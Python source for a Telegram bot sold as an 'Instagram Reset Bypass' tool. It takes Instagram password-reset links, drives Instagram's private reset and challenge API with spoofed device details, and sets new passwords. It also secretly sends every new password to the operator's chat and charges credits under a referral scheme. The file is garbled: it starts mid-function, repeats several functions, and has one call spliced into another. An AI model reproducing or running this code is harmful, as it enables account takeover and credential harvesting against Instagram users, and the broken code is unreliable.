<b>📊 Your Stats :</b>
• 👥 Total Referrals : <code>{total_referrals}</code>
• 💰 Pes Earned : <code>{user_data.get('total_earned', 0)}</code>
• 💺 Current Pes : <code>{user_data['credits']}</code>

<b>How It Works ❓:</b>
• Share Your Link With Friends
• When They Join Using Your Link
• You Both Get <b>+2 Free Pes</b>!

<b>Share This Link :</b>
Tap the button below to copy or share!"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "📤 Share Referral Link", "url": f"https://t.me/share/url?url={referral_link}&text=🔥 Join this Instagram Password Reset Bot! Get 2 free credits when you sign up using my link! 🚀"}],
            [{"text": "📋 Copy Link", "callback_data": "copy_link"}],
            [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard, disable_web_page_preview=True)

def send_profile(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    msg = f"""<b>📊 Your Profile</b>

💺 Pes : <code>{user_data['credits']}</code>
💰 Total Pes : <code>{user_data.get('total_earned', 0)}</code>
👥 Total Referrals : <code>{user_data.get('total_referrals', 0)}</code>
📅 Last Reset On : <code>{user_data.get('last_reset_date', str(date.today()))}</code>
👤 Referred By : <code>{user_data.get('referred_by') or 'None'}</code>"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_help(chat_id, message_id=None):
    msg = """<b>❓ Help & Commands</b>

<b>📌 How to get reset link:</b>
1. Go to Instagram login page
2. Click "Forgot password"
3. Enter username/email
4. Check your email for reset link
5. Copy FULL link and send here

<b>⚠️ Note:</b>
• Each reset costs 1 credit
• You get 2 free credits daily
• Failed resets are refunded

<b>💰 Get More Credits:</b>
Use referral system! Share your unique link with friends.

<b>Commands:</b>
/start - Main menu
/profile - Your stats
/refer - Referral info
/balance - Check credits
/cancel - Cancel current operation"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_balance(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    msg = f"💺 <b>Your Remaining Pes :</b> <code>{user_data['credits']}</code>\n\nUse /refer to get more credits!"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def process_reset_link_with_progress(chat_id, user_id, reset_link, message_id=None):
    """Process reset link with animated progress bar"""
    global user_active_message
    
    # Check credits first
    user_data = get_user_data(user_id)
    if user_data["credits"] < 1:
        msg = """❌ <b>Insufficient Credits!</b>

You need 1 Pes to reset a password.

💡 <b>Get More Pes :</b>
• Share your referral link〈 2 Pes each 〉
• Wait for daily reset〈2 free per day 〉

— Dm @xYourKing To Buy Pes

"""
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
            ]
        }
        edit_or_send(chat_id, msg, message_id, keyboard)
        return
    
    # Deduct credit
    deduct_credit(user_id)
    
    # Progress update function
    current_msg_id = message_id
    if not current_msg_id:
        # Send initial message if no message_id provided
        result = send_message(chat_id,         if "referred_by" not in db[user_id_str]:
            db[user_id_str]["referred_by"] = None
            save_db(db)
    
    return db[user_id_str]

def update_user_credits(user_id, credits):
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str in db:
        db[user_id_str]["credits"] = credits
        save_db(db)

def add_credits(user_id, amount):
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str in db:
        db[user_id_str]["credits"] += amount
        db[user_id_str]["total_earned"] = db[user_id_str].get("total_earned", 0) + amount
        save_db(db)
        return True
    return False

def deduct_credit(user_id):
    user_data = get_user_data(user_id)
    if user_data["credits"] >= 1:
        user_data["credits"] -= 1
        update_user_credits(user_id, user_data["credits"])
        return True
    return False

def generate_referral_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def verify_user_subscription(user_id):
    """Verify if user has joined all required channels"""
    if not ENABLE_FORCE_SUB:
        return True, None
    
    for channel in FORCE_SUB_CHANNELS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": f"@{channel}", "user_id": user_id}
        try:
            response = session.get(url, params=params, timeout=3)
            data = response.json()
            
            if data.get("ok"):
                status = data["result"].get("status", "")
                if status not in ["member", "administrator", "creator"]:
                    return False, channel
            else:
                return False, channel
        except Exception:
            return False, channel
    
    return True, None

def edit_or_send(chat_id, text, message_id=None, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    """Edit existing message or send new one if no message_id"""
    if message_id:
        # Edit existing message
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        payload = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": disable_web_page_preview
        }
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        try:
            response = session.post(url, data=payload, timeout=5)
            return response.json()
        except:
            return None
    else:
        # Send new message
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": disable_web_page_preview
        }
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        try:
            response = session.post(url, data=payload, timeout=5)
            return response.json()
        except:
            return None

def send_subscription_required(chat_id, user_id, message_id=None):
    """Send subscription required message with inline buttons"""
    required_channels = []
    for channel in FORCE_SUB_CHANNELS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": f"@{channel}", "user_id": user_id}
        try:
            response = session.get(url, params=params, timeout=3)
            data = response.json()
            if data.get("ok"):
                status = data["result"].get("status", "")
                if status not in ["member", "administrator", "creator"]:
                    required_channels.append(channel)
            else:
                required_channels.append(channel)
        except:
            required_channels.append(channel)
    
    if not required_channels:
        return True
    
    channels_list = "\n".join([f"📢 <a href='https://t.me/{ch}'>{ch}</a>" for ch in required_channels])
    
    msg = f"""⚠️ <b>Jᴏɪɴ Cʜᴀɴɴᴇʟs Tᴏ Usᴇ Tʜᴇ Bᴏᴛ</b>

Aғᴛᴇʀ Jᴏɪɴɪɴɢ, ᴄʟɪᴄᴋ ᴠᴇʀɪғʏ ⬇️"""

    keyboard_buttons = []
    for ch in required_channels:
        keyboard_buttons.append([{"text": f"Jᴏɪɴ Cʜᴀɴɴᴇʟ", "url": f"https://t.me/{ch}"}])
    
    keyboard_buttons.append([{"text": "✅ Vᴇʀɪғɪʏ Sᴜʙsᴄʀɪᴘᴛɪᴏɴ", "callback_data": "verify_sub"}])
    keyboard_buttons.append([{"text": "🔄 Rᴇғʀᴇsʜ", "callback_data": "refresh_sub"}])
    
    keyboard = {"inline_keyboard": keyboard_buttons}
    
    edit_or_send(chat_id, msg, message_id, keyboard, disable_web_page_preview=False)
    return False

def generate_device_info():
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    USER_AGENT = f"Instagram 394.0.0.46.81 Android ({random.choice(['28/9','29/10','30/11','31/12'])}; {random.choice(['240dpi','320dpi','480dpi'])}; {random.choice(['720x1280','1080x1920','1440x2560'])}; {random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; {random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; intel; en_US; {random.randint(100000000,999999999)})"
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.now().timestamp())
    nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:Random@{nums}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD

def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Content-Length": "9481"
    }

def id_user(user_id):
    try:
        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
        headers = {"User-Agent": "Instagram 219.0.0.12.117 Android"}
        r = session.get(url, headers=headers, timeout=5)
        try:
            username = r.json()["user"]["username"]
            return username
        except:
            return None
    except:
        return None

def reset_instagram_password(reset_link, progress_callback=None):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
        
        if progress_callback:
            progress_callback(10, "Extracting reset token...")
        
        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token = reset_link.split("&token=")[1].split(":")[0]

        if progress_callback:
            progress_callback(25, "Sending reset request...")
        
        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {
            "source": "one_click_login_email",
            "uidb36": uidb36,
            "device_id": ANDROID_ID,
            "token": token,
            "waterfall_id": WATERFALL_ID
        }
        r = session.post(url, headers=make_headers(user_agent=USER_AGENT), data=data, timeout=10)
        
        if "user_id" not in r.text:
            return {"success": False, "error": f"Error in reset request: {r.text[:200]}"}

        if progress_callback:
            progress_callback(40, "Processing challenge...")
        
        mid = r.headers.get("Ig-Set-X-Mid")
        resp_json = r.json()
        user_id = resp_json.get("user_id")
        cni = resp_json.get("cni")
        nonce_code = resp_json.get("nonce_code")
        challenge_context = resp_json.get("challenge_context")

        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id": str(user_id),
            "cni": str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context": str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge": "true"
        }
        
        if progress_callback:
            progress_callback(55, "Solving challenge...")
        
        r2 = session.post(url2, headers=make_headers(mid, USER_AGENT), data=data2, timeout=10).text
        
        if progress_callback:
            progress_callback(70, "Setting new password...")
        
        challenge_context_final = r2.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]

        data3 = {
            "is_caa": "False",
            "source": "",
            "uidb36": "",
            "error_state": {"type_name":"str","index":0,"state_id":1048583541},
            "afv": "",
            "cni": str(cni),
            "token": "",
            "has_follow_up_screens": "0",
            "bk_client_context": {"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"},
            "challenge_context": challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1": PASSWORD,
            "enc_new_password2": PASSWORD
        }
        
        session.post(url2, headers=make_headers(mid, USER_AGENT), data=data3, timeout=10)
        new_password = PASSWORD.split(":")[-1]
        
        if progress_callback:
            progress_callback(90, "Finalizing...")
        
        return {
            "success": True,
            "password": new_password,
            "user_id": user_id
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        session.post(url, data=payload, timeout=5)
    except:
        pass

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"offset": offset, "timeout": 25}
    try:
        response = session.get(url, params=params, timeout=30)
        return response.json()
    except:
        return None

def send_message(chat_id, text, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": disable_web_page_preview}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=5)
        return response.json()
    except:
        return None

def send_start_menu(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    credits = user_data["credits"]
    referral_code = user_data["referral_code"]
    total_referrals = user_data.get("total_referrals", 0)
    
    msg = f"""<b>Wᴇʟᴄᴏᴍᴇ Tᴏ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Bʏᴘᴀss Bᴏᴛ</b>

📊 <b>Your Stats:</b>
• 💎 Cʀᴇᴅɪᴛs : <code>{credits}</code>《 2 Fʀᴇᴇ Pᴇʀ Dᴀʏ 》
• 👥 Rᴇғғᴇʀᴀʟs : <code>{total_referrals}</code> users
• 💰 Tᴏᴛᴀʟ Pᴛs : <code>{user_data.get('total_earned', 0)}</code> Pᴛs

Cʜᴏᴏsᴇ Aɴ Oᴘᴛɪᴏɴ Tᴏ Pʀᴏᴄᴇᴇᴅ ⬇️
"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "𓁿Rᴇsᴇᴛ Bʏᴘᴀss", "callback_data": "send_reset_link"}],
            [{"text": "👥 Rᴇғғᴇʀᴀʟ Iɴғᴏ", "callback_data": "referral_info"}, {"text": "📊 Mʏ Sᴛᴀᴛs", "callback_data": "profile"}],
            [{"text": "❓ Hᴇʟᴘ & Sᴜᴘᴘᴏʀᴛ", "callback_data": "help"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_instruction_for_link(chat_id, message_id=None):
    msg = """Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Bʏᴘᴀss 

Wɪᴛʜ Tʜɪs Fᴇᴀᴛᴜʀᴇ, Yᴏᴜ Cᴀɴ 
ʙʏᴘᴀss Sᴇʟғɪᴇ Bᴇʀɪғɪᴄᴀᴛɪᴏɴ Bʏ Sᴇɴᴅɪɴɢ Yᴏᴜʀ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Lɪɴᴋ.

Pʟᴇᴀsᴇ Sᴇɴᴅ Yᴏᴜʀ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Lɪɴᴋ ⬇️"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_referral_info(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    referral_link = user_data.get("referral_link", f"https://t.me/{BOT_USERNAME}?start=ref_{user_data['referral_code']}")
    total_referrals = user_data.get("total_referrals", 0)
    
    msg = f"""<b>👥 Rᴇғғᴇʀᴀʟ Pʀᴏɢʀᴀᴍ</b>

<b>Yᴏᴜʀ Rᴇғғᴇʀᴀʟ Iɴᴠɪᴛᴇ Lɪɴᴋ:</b>

<code>{referral_link}</code>

<b>📊 Yᴏᴜʀ Sᴛᴀᴛs :</b>
• 👥 Tᴏᴛᴀʟ Rᴇғғᴇʀᴀʟs : <code>{total_referrals}</code>
• 💎 Pᴛs Eᴀʀɴᴇᴅ : <code>{user_data.get('total_earned', 0)}</code>
• 💰 Cᴜʀʀᴇɴᴛ Pᴛs : <code>{user_data['credits']}</code>

<b>Hᴏᴡ Iᴛ Wᴏʀᴋs ❓:</b>
• Sʜᴀʀᴇ Yᴏᴜʀ Lɪɴᴋ Wɪᴛʜ Fʀɪᴇɴᴅs
• Wʜᴇɴ Tʜᴇʏ Jᴏɪɴ Usɪɴɢ Yᴏᴜʀ Lɪɴᴋ
• Yᴏᴜ Bᴏᴛʜ Gᴇᴛ <b>+2 Fʀᴇᴇ Pᴛs</b>!

<b>Sʜᴀʀᴇ Tʜɪs Lɪɴᴋ :</b>
Tᴀᴘ ᴀɴᴅ ʜᴏʟᴅ ᴛʜᴇ ʟɪɴᴋ ᴀʙᴏᴠᴇ ᴛᴏ ᴄᴏᴘʏ, ᴏʀ ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴛᴏ sʜᴀʀᴇ ᴅɪʀᴇᴄᴛʟʏ!"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "📤 Share Referral Link", "url": f"https://t.me/share/url?url={referral_link}&text=Join this Instagram Password Reset Bot!"}],
            [{"text": "📋 Copy Link", "callback_data": "copy_link"}],
            [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard, disable_web_page_preview=True)

def send_profile(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    msg = f"""<b>📊 Your Profile</b>

💎 Pᴛs : <code>{user_data['credits']}</code>
💰 Tᴏᴛᴀʟ Pᴛs : <code>{user_data.get('total_earned', 0)}</code>
👥 Tᴏᴛᴀʟ Rᴇғғᴇʀᴀʟs : <code>{user_data.get('total_referrals', 0)}</code>
📅 Lᴀsᴛ Rᴇsᴇᴛ Oɴ : <code>{user_data.get('last_reset_date', str(date.today()))}</code>
👤 Rᴇғғᴇʀᴇᴅ Bʏ : <code>{user_data.get('referred_by') or 'None'}</code>"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_help(chat_id, message_id=None):
    msg = """<b>❓ Help & Commands</b>

<b>📌 How to get reset link:</b>
1. Go to Instagram login page
2. Click "Forgot password"
3. Enter username/email
4. Check your email for reset link
5. Copy FULL link and send here

<b>⚠️ Note:</b>
• Each reset costs 1 credit
• You get 2 free credits daily
• Failed resets are refunded

<b>💰 Get More Credits:</b>
Use referral system! Share your unique link with friends.

<b>Commands:</b>
/start - Main menu
/profile - Your stats
/refer - Referral info
/balance - Check credits
/cancel - Cancel current operation"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_balance(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    msg = f"💎 <b>Yᴏᴜʀ Rᴇᴍᴀɪɴɪɴɢ Pᴛs :</b> <code>{user_data['credits']}</code>\n\nUse /refer to get more credits!"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def process_reset_link_with_progress(chat_id, user_id, reset_link, message_id=None):
    """Process reset link with animated progress bar"""
    
    # Check credits first
    user_data = get_user_data(user_id)
    if user_data["credits"] < 1:
        msg = """❌ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs!</b>

Yᴏᴜ ɴᴇᴇᴅ 1 Pᴛs ᴛᴏ ʀᴇsᴇᴛ ᴀ ᴘᴀssᴡᴏʀᴅ.

💡 <b>Gᴇᴛ Mᴏʀᴇ Pᴛs :</b>
• Sʜᴀʀᴇ ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟ ʟɪɴᴋ《 2 Pᴛs ᴇᴀᴄʜ 》
• Wᴀɪᴛ ғᴏʀ ᴅᴀɪʟʏ ʀᴇsᴇᴛ《2 ғʀᴇᴇ ᴘᴇʀ ᴅᴀʏ 》

— Dᴍ @xYourKing Tᴏ Bᴜʏ Pᴛs

"""
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
            ]
        }
        edit_or_send(chat_id, msg, message_id, keyboard)
        return
    
    # Deduct credit
    deduct_credit(user_id)
    
    # Progress update function
    current_msg_id = message_id
    if not current_msg_id:
        # Send initial message if no message_id provided
        result = send_message(chat_id, "⚙️ <b>Pʀᴏᴄᴇssɪɴɢ ʏᴏᴜʀ ʟɪɴᴋ...</b>\n[0%] █▒▒▒▒▒▒▒▒▒")
        if result and "result" in result:
            current_msg_id = result["result"]["message_id"]
    
    def update_progress(percent, status_text):
        if current_msg_id:
            if percent >= 100:
                percent = 99
            filled = int(percent / 10)
            empty = 10 - filled
            bar = "█" * filled + "▒" * empty
            edit_or_send(chat_id, f"⚙️ <b>Pʀᴏᴄᴇssɪɴɢ ʏᴏᴜʀ ʟɪɴᴋ...</b>\n[{percent}%] {bar}\n└ 🔄 {status_text}", current_msg_id)
    
    # Run reset with progress updates
    result = reset_instagram_password(reset_link, update_progress)
    
    # Update to 100% before finishing
    if current_msg_id:
        edit_or_send(chat_id, f"⚙️ <b>Pʀᴏᴄᴇssɪɴɢ ʏᴏᴜʀ ʟɪɴᴋ...</b>\n[100%] {'█' * 10}\n└ ✅ Complete!", current_msg_id)
        time.sleep(0.3)
    
    if result.get("success"):
        user_id_insta = result.get("user_id")
        new_password = result.get("password")
        username = id_user(user_id_insta)
        
        if username:
            msg = f"<b>Pᴀssᴡᴏʀᴅ Rᴇsᴇᴛ Dᴏɴᴇ</b>\n\nUsᴇʀɴᴀᴍᴇ : <code>{username}</code>\nNᴇᴡ Pᴀssᴡᴏʀᴅ : <code>{new_password}</code>\n🆔 Sᴇssɪᴏɴ Iᴅ : <code>{user_id_insta}</code>"
        else:
            msg = f"<b>Pᴀssᴡᴏʀᴅ Rᴇsᴇᴛ Dᴏɴᴇ</b>\n\nNᴇᴡ Pᴀssᴡᴏʀᴅ : <code>{new_password}</code>\n🆔 Sᴇssɪᴏɴ Iᴅ : <code>{user_id_insta}</code>"
        
        remaining = get_user_data(user_id)["credits"]
        msg += f"\n\n📊 Rᴇᴍᴀɪɴɪɴɢ ᴄʀᴇᴅɪᴛs : <b>{remaining}</b>\n\nUse /refer to get more credits!"
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
            ]
        }
        
        edit_or_send(chat_id, msg, current_msg_id, keyboard)
        send_telegram_message(f"🎯 Rᴇsᴇᴛ Dᴏɴᴇ\nUser: {user_id}\nPᴀssᴡᴏʀᴅ: {new_password}")
        
    else:
        # Refund credit if failed
        add_credits(user_id, 1)
        
        msg = f"❌ <b>Rᴇsᴇᴛ Fᴀɪʟᴇᴅ!</b>\n\nError: {result.get('error', 'Unknown error')}\n\nYᴏᴜʀ Pᴛs ʜᴀs ʙᴇᴇɴ ʀᴇғᴜɴᴅᴇᴅ."
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔄 Tʀʏ Aɢᴀɪɴ", "callback_data": "send_reset_link"}],
                [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
            ]
        }
        
        edit_or_send(chat_id, msg, current_msg_id, keyboard)

def handle_referral(user_id, referred_by):
    db = load_db()
    user_id_str = str(user_id)
    referred_by_str = str(referred_by)
    
    if user_id_str not in db:
        get_user_data(user_id)
        db = load_db()
    
    if db[user_id_str].get("referred_by") is None and user_id_str != referred_by_str:
        db[user_id_str]["referred_by"] = referred_by_str
        
        if referred_by_str in db:
            db[referred_by_str]["total_referrals"] = db[referred_by_str].get("total_referrals", 0) + 1
            save_db(db)
        
        add_credits(user_id, 2)
        add_credits(int(referred_by_str), 2)
        
        return True
    return False

def admin_grant_credits(admin_id, target_user_id, amount):
    if admin_id not in ADMIN_IDS:
        return False, "Not authorized"
    try:
        add_credits(target_user_id, amount)
        return True, f"✅ Added {amount} credits to user {target_user_id}"
    except:
        return False, "Error adding credits"

# Store active message IDs for each user
user_active_message = {}

def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or CHAT_ID == "YOUR_CHAT_ID_HERE":
        print("Please set BOT_TOKEN and CHAT_ID in the script first!")
        return
    
    # Migrate existing user data
    migrate_user_data()
    
    send_telegram_message("Bot Started Successfully!")
    print(f"🚀 Bot is running... Username: @{BOT_USERNAME}")
    print(f"📊 Force Subscribe: {'ON' if ENABLE_FORCE_SUB else 'OFF'}")
    print(f"📢 Channels: {', '.join(FORCE_SUB_CHANNELS) if FORCE_SUB_CHANNELS else 'None'}")
    
    last_update_id = None
    waiting_for_link = {}
    
    while True:
        try:
            updates = get_updates(last_update_id)
            
            if updates and updates.get("ok") and updates.get("result"):
                for update in updates["result"]:
                    last_update_id = update["update_id"] + 1
                    
                    if "callback_query" in update:
                        query = update["callback_query"]
                        query_id = query["id"]
                        chat_id = query["message"]["chat"]["id"]
                        user_id = query["from"]["id"]
                        data = query["data"]
                        message_id = query["message"]["message_id"]
                        
                        # Store active message for this user
                        user_active_message[user_id] = message_id
                        
                        # Force subscribe check
                        if ENABLE_FORCE_SUB:
                            is_subscribed, _ = verify_user_subscription(user_id)
                            if not is_subscribed:
                                send_subscription_required(chat_id, user_id, message_id)
                                # Answer callback
                                url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
                                session.post(url, data={"callback_query_id": query_id})
                                continue
                        
                        if data == "verify_sub":
                            is_subscribed, _ = verify_user_subscription(user_id)
                            if is_subscribed:
                                send_start_menu(chat_id, user_id, message_id)
                            else:
                                send_subscription_required(chat_id, user_id, message_id)
                        
                        elif data == "refresh_sub":
                            is_subscribed, _ = verify_user_subscription(user_id)
                            if is_subscribed:
                                send_start_menu(chat_id, user_id, message_id)
                            else:
                                send_subscription_required(chat_id, user_id, message_id)
                        
                        elif data == "send_reset_link":
                            waiting_for_link[user_id] = True
                            send_instruction_for_link(chat_id, message_id)
                        
                        elif data == "back_to_menu":
                            if user_id in waiting_for_link:
                                del waiting_for_link[user_id]
                            send_start_menu(chat_id, user_id, message_id)
                        
                        elif data == "referral_info":
                            send_referral_info(chat_id, user_id, message_id)
                        
                        elif data == "copy_link":
                            user_data = get_user_data(user_id)
                            referral_link = user_data.get("referral_link", f"https://t.me/{BOT_USERNAME}?start=ref_{user_data['referral_code']}")
                            msg = f"✅ <b>Link copied!</b>\n\nYour referral link:\n<code>{referral_link}</code>\n\nShare this link with your friends!"
                            
                            keyboard = {
                                "inline_keyboard": [
                                    [{"text": "📤 Share Now", "url": f"https://t.me/share/url?url={referral_link}&text=🔥 Join this Instagram Password Reset Bot! Get 2 free credits when you sign up using my link! 🚀"}],
                                    [{"text": "🔙 Back to Referral Menu", "callback_data": "referral_info"}]
                                ]
                            }
                            edit_or_send(chat_id, msg, message_id, keyboard)
                        
                        elif data == "profile":
                            send_profile(chat_id, user_id, message_id)
                        
                        elif data == "help":
                            send_help(chat_id, message_id)
                        
                        # Answer callback
                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
                        session.post(url, data={"callback_query_id": query_id})
                    
                    elif "message" in update and "text" in update["message"]:
                        chat_id = update["message"]["chat"]["id"]
                        user_id = update["message"]["from"]["id"]
                        text = update["message"]["text"]
                        
                        # Get the active message ID to edit
                        active_msg_id = user_active_message.get(user_id)
                        
                        # Force subscribe check
                        if ENABLE_FORCE_SUB:
                            is_subscribed, _ = verify_user_subscription(user_id)
                            if not is_subscribed:
                                send_subscription_required(chat_id, user_id, active_msg_id)
                                continue
                        
                        if text.startswith("/start"):
                            if "ref_" in text:
                                ref_code = text.split("ref_")[1].strip()
                                db = load_db()
                                for uid, data in db.items():
                                    if data.get("referral_code") == ref_code and uid != str(user_id):
                                        if handle_referral(user_id, uid):
                                            send_message(chat_id, f"✅ <b>Referral Accepted!</b>\n\nYou got +2 credits!\n\nClick /start to begin using the bot.")
                                        break
                            
                            if user_id in waiting_for_link:
                                del waiting_for_link[user_id]
                            send_start_menu(chat_id, user_id, active_msg_id)
                        
                        elif text.startswith("/cancel"):
                            if user_id in waiting_for_link:
                                del waiting_for_link[user_id]
                            send_start_menu(chat_id, user_id, active_msg_id)
                            send_message(chat_id, "✅ Operation cancelled. Returned to main menu.")
                        
                        elif text.startswith("/profile"):
                            send_profile(chat_id, user_id, active_msg_id)
                        
                        elif text.startswith("/balance"):
                            send_balance(chat_id, user_id, active_msg_id)
                        
                        elif text.startswith("/refer"):
                            send_referral_info(chat_id, user_id, active_msg_id)
                        
                        elif text.startswith("/grant") and user_id in ADMIN_IDS:
                            parts = text.split()
                            if len(parts) == 3:
                                try:
                                    target = int(parts[1])
                                    amount = int(parts[2])
                                    success, msg = admin_grant_credits(user_id, target, amount)
                                    send_message(chat_id, msg)
                                except:
                                    send_message(chat_id, "❌ Usage: /grant [user_id] [amount]")
                            else:
                                send_message(chat_id, "❌ Usage: /grant [user_id] [amount]")
                        
                        elif text.startswith("/stats") and user_id in ADMIN_IDS:
                            db = load_db()
                            total_users = len(db)
                            total_credits = sum(data.get("credits", 0) for data in db.values())
                            total_referrals = sum(data.get("total_referrals", 0) for data in db.values())
                            msg = f"""📊 <b>Bot Statistics</b>

👥 Total Users: {total_users}
💎 Total Credits: {total_credits}
👥 Total Referrals: {total_referrals}
📈 Avg Credits/User: {total_credits/total_users if total_users else 0:.2f}"""
                            send_message(chat_id, msg)
                        
                        elif "instagram.com" in text.lower() and "uidb36" in text:
                            if user_id in waiting_for_link or True:
                                if user_id in waiting_for_link:
                                    del waiting_for_link[user_id]
                                Thread(target=process_reset_link_with_progress, args=(chat_id, user_id, text, active_msg_id)).start()
                            else:
                                keyboard = {
                                    "inline_keyboard": [
                                        [{"text": "✅ Yes, Reset Password", "callback_data": "send_reset_link"}],
                                        [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
                                    ]
                                }
                                edit_or_send(chat_id, "I detected an Instagram reset link. Would you like to reset the password? (Costs 1 credit)", active_msg_id, keyboard)
                        
                        elif text.startswith("/"):
                            pass
                        
                        elif user_id in waiting_for_link:
